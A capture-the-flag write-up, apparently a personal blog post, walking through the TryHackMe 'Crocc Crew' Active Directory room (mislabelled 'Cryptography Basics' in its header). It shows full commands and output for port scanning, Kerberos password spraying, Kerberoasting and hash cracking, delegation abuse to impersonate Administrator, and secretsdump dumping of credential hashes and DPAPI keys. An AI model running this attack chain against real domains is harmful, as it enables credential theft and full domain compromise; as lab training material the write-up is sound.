---
title: TryHackMe Cryptography Basics
date: 2024-11-05
tags: [tryhackme, ctf]
author: nandakishor
---

#Crocc Crew
![alt text](../assets/images/crocc-crew-thm/d387f5c6b5c2bfd07451dd27c187e185.png)

```

──(kali㉿kali)-[~/tmp]
└─$ rustscan -a 10.10.61.167 -- -sCV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.61.167:88
Open 10.10.61.167:139
Open 10.10.61.167:135
Open 10.10.61.167:389
Open 10.10.61.167:445
Open 10.10.61.167:464
Open 10.10.61.167:593
Open 10.10.61.167:636
Open 10.10.61.167:3389
Open 10.10.61.167:9389
Open 10.10.61.167:49668
Open 10.10.61.167:49666
Open 10.10.61.167:49671
Open 10.10.61.167:49672
Open 10.10.61.167:49678
Open 10.10.61.167:49713
[~] Starting Script(s)

PORT      STATE SERVICE       REASON  VERSION
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-11-05 03:46:58Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Issuer: commonName=DC.COOCTUS.CORP
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:43:31
| Not valid after:  2025-05-06T03:43:31
| MD5:   42be:744b:9dbd:447b:36a0:d394:0cff:02d2
| SHA-1: 34d3:1f78:7b59:0e87:e56c:f09b:3063:2302:69cc:f952
| -----BEGIN CERTIFICATE-----
| MIIC4jCCAcqgAwIBAgIQZZokeP22qrlIjVN1I9UEVjANBgkqhkiG9w0BAQsFADAa
| MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjQxMTA0MDM0MzMxWhcNMjUw
| NTA2MDM0MzMxWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG
| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCyH6diqdj1aa2BLaHyANx5ZRA8pjt0bV54
| v8u7GSaHZaHI2kmokkVPPGR+YhfZfpPiXsBAQp1luGfNmqxavVpHVbbPveveLaRu
| kzKwzKwmjmhJNbaRYz+i/yaBM/7R8X/LWsOG/BL4/nyBKF+ZbvQlCwacM44++RQK
| R38aGCJFlQyV7bnTz+f3V7db9fweKLKok3rWh9tvVfR4214VzM77U6vvYxv3PGg3
| A1J3Z5M05wVoH7Ryg+oo2wqv/Ix8736AQD30r1qUIKPWQ+sTssRHdnwE2xxG8PNZ
| frFjBTR+jNw0mJxq1V5rb/wbP1vJLzVUUcDnQ7LQksGjNMAOOaH9AgMBAAGjJDAi
| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
| AAOCAQEADm5uhk/OhLSKMA5xC7pOfzJ/6IsBauCZWEQB/LLPWTML9ZNNSb9OVCQD
| CPEDqAPUeYj80PldA2wEqT0QFN5viYz0RoaSyU9J1JnynQqu7F82BruJHajirKuB
| OGDu9HJJc5NfW5XfaLjxAF5aF1944GYFySFgByIB7uo3SlJdmOnAlRD460tNpuoB
| 4dD76lrfHXAn+5KbZfAhTxHf+lYsOFW4EH6xyp9h3Rv5uTg5Nx15HoQsKtYZelrU
| dATrxdKP8xUoHiHNIHZ3PT8FPg5JXA+HBOp4C6zEep1AZL+hVCmdEiqBIoFy/p+a
| ECMtIUnWF/bb9SPYYuifSjdWNLqneQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2024-11-05T03:48:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2024-11-05T03:47:54+00:00
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49713/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52737/tcp): CLEAN (Timeout)
|   Check 2 (port 19046/tcp): CLEAN (Timeout)
|   Check 3 (port 43295/udp): CLEAN (Timeout)
|   Check 4 (port 24909/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2024-11-05T03:47:54
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s



```

Add the domain names to etc/hosts

`COOCTUS.CORP`
`DC.COOCTUS.CORP`


![alt text](<../assets/images/crocc-crew-thm/Screenshot 2024-11-05 091427.png>)

![alt text](<../assets/images/crocc-crew-thm/Screenshot 2024-11-05 091630.png>)

we can find some creds here , but we dont know where to use it


`rdesktop -u ''  10.10.61.167`
![alt text](<../assets/images/crocc-crew-thm/Screenshot 2024-11-05 092744.png>)

they gave us a username and a password , so try to enumerate using this

```
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ echo "Visitor" > username.txt
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ kerbrute userenum -d COOCTUS.CORP --dc DC.COOCTUS.CORP username.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/05/24 - Ronnie Flathers @ropnop

2024/11/05 09:33:34 >  Using KDC(s):
2024/11/05 09:33:34 >  	DC.COOCTUS.CORP:88

2024/11/05 09:33:34 >  [+] VALID USERNAME:	 Visitor@COOCTUS.CORP
2024/11/05 09:33:34 >  Done! Tested 1 usernames (1 valid) in 0.217 seconds
```

`Visitor@COOCTUS.CORP`
is a valid username

```
┌──(kali㉿kali)-[~/tmp]
└─$ echo "Visitor@COOCTUS.CORP" > username.txt 
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ kerbrute passwordspray -d COOCTUS.CORP --dc DC.COOCTUS.CORP username.txt 'GuestLogin!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/05/24 - Ronnie Flathers @ropnop

2024/11/05 09:35:10 >  Using KDC(s):
2024/11/05 09:35:10 >  	DC.COOCTUS.CORP:88

2024/11/05 09:35:15 >  [+] VALID LOGIN:	 Visitor@COOCTUS.CORP:GuestLogin!
2024/11/05 09:35:15 >  Done! Tested 1 logins (1 successes) in 5.710 seconds
```

its valid
Now get the TGT

```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-getTGT COOCTUS.CORP/Visitor:'GuestLogin!'                                       
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Saving ticket in Visitor.ccache
                                                                                                                     
┌──(kali㉿kali)-[~/tmp]
└─$ ls
Visitor.ccache  creds  exploit.sh  index.html  username.txt
```

```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-GetUserSPNs -request -dc-ip 10.10.61.167 COOCTUS.CORP/Visitor -k
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Getting machine hostname
[-] CCache file is not found. Skipping...
ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-09 03:30:39.356663  2021-06-09 03:16:23.369540  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$46c30ac8e2d3480c91c94cb05e9b00a9$1100fe71a0c32da06809f3e47f43447250fbaddb02f3f59698bb4f6e86ef99afb1c99fb87a915918c0f1d00c8abcad6c44abd9b6a73c7623d622c1d533718452f3206fd8d08eb689de7554203a4490527d061025cd890293a87dba6c6b5761cbba5ab21ff8e59127633aa93662e8d661cce5caa88e1098b1a623dca24d0f6a71aa375a581a60e3c81996eb3f1a30c5308309b94067552b24bdc06d39a61faa21f802f1d747ec19623b4faf0a8e5bfe6a72884a9e79af3c208191058c9bbcd082380248eb394c1040cba373159ceb26d1c6a67a61d19b446a7a6b0633770dc25e003ace15720f781e7f8fba33b5944b81bf0a07224f05928e3158fce129e5c803093d4320948cc8cf6e277599ee08b5c37a3bfc1c8149c03287d2a8f896ead0743293dccbec51a1247b9fd7ef3b9ca4a03f6b0ad0c0937d835fa3c6ab2896ec3519f3000e7d0f4a30537de832319250660564c10b38dfd720ba2804c25f75b73200140c9cc2e267449ab2ed2ecd0de1b81ec1d661ff01c124515397a71719b25028794d400ff3e69300f1025f1d466c2499ec6
```

crack this hash

`hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt`

username: `password-reset`

password: `resetpassword`

```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-getTGT COOCTUS.CORP/password-reset:resetpassword
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Saving ticket in password-reset.ccache
```
```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator COOCTUS.CORP/password-reset -k
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```

```
┌──(kali㉿kali)-[~/tmp]
└─$ impacket-secretsdump DC.COOCTUS.CORP -k -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:6933abd6191cd79c40799c45a5d14840447e384f231714e60426bd475f8a49f531a0303e3098d8920769082e6b7d7492ba70cbc0889018e1bb319d905e814d8c80d577287014aae375756607f834a9a7e2a1ac6d7e6d94773e8e5017b8a8f4e8742d818ce5c103508070831b381fd8aceb3dddd049760ae7aa3ffa74f11b05960b8e2bc79abbeeaeb496f68dcaa2dd0864f0506562514fac8f6f55aeac0d4be6de2d719e6c85f17a0964ce54608d9d298379a7364062f94c1763085d4cdb00bed51795196c8f002c83ba6f99b114e3314be383a83ad5d4ea47423bc29b9d4d582de5fe67d60f1f81ef21c21349081522
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:0fe4d35255ee8b7fe7c6d6260a83faae:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] timed out
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

